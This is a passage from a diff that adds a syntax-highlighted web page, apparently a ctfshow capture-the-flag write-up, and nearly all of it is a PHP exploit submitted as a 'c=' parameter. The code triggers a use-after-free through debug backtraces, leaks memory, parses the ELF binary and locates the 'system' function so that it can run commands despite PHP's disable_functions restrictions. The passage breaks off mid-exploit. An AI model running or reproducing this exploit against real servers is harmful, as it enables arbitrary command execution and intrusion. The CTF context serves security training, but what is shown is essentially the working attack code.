+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="k">function</span> <span class="nf">ctfshow</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$abc</span><span class="p">,</span> <span class="nv">$helper</span><span class="p">,</span> <span class="nv">$backtrace</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Vuln</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">            <span class="k">global</span> <span class="nv">$backtrace</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">            <span class="nx">unset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$backtrace</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nx">Exception</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">getTrace</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$backtrace</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="s1">&#39;args&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$backtrace</span> <span class="o">=</span> <span class="nx">debug_backtrace</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Helper</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">,</span> <span class="nv">$c</span><span class="p">,</span> <span class="nv">$d</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">str2ptr</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$address</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="nv">$s</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$address</span> <span class="o">&lt;&lt;=</span> <span class="mi">8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$address</span> <span class="o">|=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$str</span><span class="p">[</span><span class="nv">$p</span><span class="o">+</span><span class="nv">$j</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$address</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">ptr2str</span><span class="p">(</span><span class="nv">$ptr</span><span class="p">,</span> <span class="nv">$m</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$out</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$m</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$out</span> <span class="o">.=</span> <span class="nx">sprintf</span><span class="p">(</span><span class="s2">&#34;%c&#34;</span><span class="p">,(</span><span class="nv">$ptr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$ptr</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">write</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$p</span><span class="p">,</span> <span class="nv">$v</span><span class="p">,</span> <span class="nv">$n</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$str</span><span class="p">[</span><span class="nv">$p</span> <span class="o">+</span> <span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">sprintf</span><span class="p">(</span><span class="s2">&#34;%c&#34;</span><span class="p">,(</span><span class="nv">$v</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$v</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nv">$abc</span><span class="p">,</span> <span class="nv">$helper</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="nv">$addr</span> <span class="o">+</span> <span class="nv">$p</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$leak</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$helper</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$s</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$leak</span> <span class="o">%=</span> <span class="mi">2</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="nv">$s</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$leak</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">parse_elf</span><span class="p">(</span><span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$e_type</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">        <span class="nv">$e_phoff</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$e_phentsize</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$e_phnum</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$e_phnum</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$header</span> <span class="o">=</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$e_phoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_phentsize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$p_type</span>  <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$p_flags</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$p_vaddr</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$p_memsz</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">                <span class="nv">$data_addr</span> <span class="o">=</span> <span class="nv">$e_type</span> <span class="o">==</span> <span class="mi">2</span> <span class="o">?</span> <span class="nv">$p_vaddr</span> <span class="o">:</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$p_vaddr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$data_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">                <span class="nv">$text_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$data_addr</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$text_size</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$data_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">get_basic_funcs</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$elf</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">list</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$elf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$data_size</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$leak</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&lt;</span> <span class="nv">$data_addr</span> <span class="o">-</span> <span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$deref</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x746e6174736e6f63</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">            <span class="nv">$leak</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&lt;</span> <span class="nv">$data_addr</span> <span class="o">-</span> <span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$deref</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x786568326e6962</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$data_addr</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">get_binary_base</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$base</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$start</span> <span class="o">=</span> <span class="nv">$binary_leak</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$start</span> <span class="o">-</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nv">$i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$leak</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">==</span> <span class="mh">0x10102464c457f</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$basic_funcs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">do</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$f_entry</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$f_name</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$f_entry</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$f_name</span> <span class="o">==</span> <span class="mh">0x6d6574737973</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$addr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$addr</span> <span class="o">+=</span> <span class="mh">0x20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nv">$f_entry</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">trigger_uaf</span><span class="p">(</span><span class="nv">$arg</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">        <span class="nv">$arg</span> <span class="o">=</span> <span class="nx">str_shuffle</span><span class="p">(</span><span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$vuln</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vuln</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$vuln</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="nv">$arg</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="k">PHP_OS</span><span class="p">,</span> <span class="s1">&#39;WIN&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;This PoC is for *nix systems only.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$n_alloc</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$contiguous</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n_alloc</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$contiguous</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">str_shuffle</span><span class="p">(</span><span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nx">trigger_uaf</span><span class="p">(</span><span class="s1">&#39;x&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$abc</span> <span class="o">=</span> <span class="nv">$backtrace</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$helper</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Helper</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$helper</span><span class="o">-&gt;</span><span class="na">b</span> <span class="o">=</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$x</span><span class="p">)</span> <span class="p">{</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$abc</span><span class="p">)</span> <span class="o">==</span> <span class="mi">79</span> <span class="o">||</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$abc</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;UAF failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$closure_handlers</span> <span class="o">=</span> <span class="nx">str2ptr</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$php_heap</span> <span class="o">=</span> <span class="nx">str2ptr</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$abc_addr</span> <span class="o">=</span> <span class="nv">$php_heap</span> <span class="o">-</span> <span class="mh">0xc8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="nv">$abc_addr</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">);</span>
